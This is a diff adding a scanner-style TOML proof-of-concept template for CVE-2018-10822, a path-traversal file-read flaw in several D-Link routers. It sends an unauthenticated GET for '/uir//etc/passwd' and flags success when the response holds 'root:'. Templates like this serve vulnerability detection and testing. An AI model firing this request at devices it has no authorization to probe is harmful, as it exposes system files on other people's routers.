@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "D-Link DWR-116、DIR-140L、DIR-640L等多款路由器httpd服务存在本地文件包含漏洞，远程未经认证的攻击者可通过在HTTP请求中发送'/uir//'后附加路径遍历序列读取目标设备任意文件"
+id = "POC-AVE-2018-0046"
+name = "D-Link 多款路由器 httpd 服务本地文件包含漏洞 PoC"
+severity = "high"
+tags = ["cve-2018-10822"]
+vuln_id = [
+    "CVE-2018-10822",
+    "AVE-2018-0046",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/uir//etc/passwd"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
